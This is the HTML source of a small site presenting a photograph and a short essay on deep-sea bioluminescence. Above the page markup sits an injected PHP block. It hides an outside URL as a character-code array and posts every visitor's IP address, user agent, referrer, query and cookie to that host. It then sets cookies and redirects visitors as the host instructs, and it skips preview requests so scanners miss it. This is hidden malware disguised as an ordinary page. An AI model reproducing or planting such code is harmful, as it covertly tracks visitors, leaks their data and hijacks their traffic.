<!DOCTYPE html>
<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "540065";$uid="y08pu5upjg2735iw3ufxokqb8";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>

<html lang="en">
    <head>
        <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/6aa7f265b22c113442d0b9e7/1k2g0lnlv';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>The Light Below — bioluminescence in the deep ocean</title>
    <meta name="description" content="A single photograph and a short note on bioluminescence, the cold living light that most of the deep ocean makes for itself.">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="The Light Below">
    <meta property="og:title" content="The Light Below — bioluminescence in the deep ocean">
    <meta property="og:description" content="A single photograph and a short note on bioluminescence, the cold living light that most of the deep ocean makes for itself.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Bodoni+Moda:ital,opsz,wght@0,6..96,400;0,6..96,500;1,6..96,400&amp;family=Karla:wght@300;400;500&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/styles.css">
  </head>
  <body>
    <div class="grain" aria-hidden="true"></div>

    <main class="page">
      <section class="plate">
        <figure class="plate__figure">
          <img class="plate__img" src="images/images.webp" srcset="images/images_2.webp 700w, images/images_1.webp 1100w, images/images.webp 1400w" sizes="(max-width: 900px) 100vw, 58vw" width="1376" height="768" alt="A translucent siphonophore drifting in black water, its body and trailing filaments lit from within in cold cyan, surrounded by flecks of glowing marine snow.">
          <figcaption class="plate__caption">
            <span class="plate__caption-rule" aria-hidden="true"></span>
            A siphonophore in the bathypelagic, roughly 2,000&nbsp;m down — the
            only light in frame is its own.
          </figcaption>
        </figure>

        <div class="plate__text">
          <p class="eyebrow">Marine bioluminescence</p>
          <h1 class="title">The Light<br><em>Below</em></h1>
          <p class="lede">
            Sunlight gives out somewhere around 200 metres, and everything beneath
            that — the overwhelming majority of the livable space on this
            planet — is lit, if at all, by the animals living in it. Roughly
            three quarters of the creatures surveyed in the open water column can
            make their own light, using a pigment called luciferin that releases a
            cold blue-green glow when it meets oxygen. They spend it carefully: a
            hatchetfish matches the faint glimmer above it so nothing hunting from
            below can pick out its silhouette, a vampire squid throws a cloud of
            luminous mucus instead of ink and leaves the burglar alarm behind while
            it slips away, and an anglerfish grows a lure it does not even fuel
            itself but rents out to bacteria. The photograph above was made with no
            light at all beyond what the animal in it was already emitting, which is
            the part worth sitting with — the deep sea is not a dark place so
            much as a place that decided to do its own lighting.
          </p>
          <p class="depth" aria-hidden="true">
            <span>200 m</span><span class="depth__rule"></span><span>4,000 m</span>
          </p>
        </div>
      </section>
    </main>
  

</body></html>
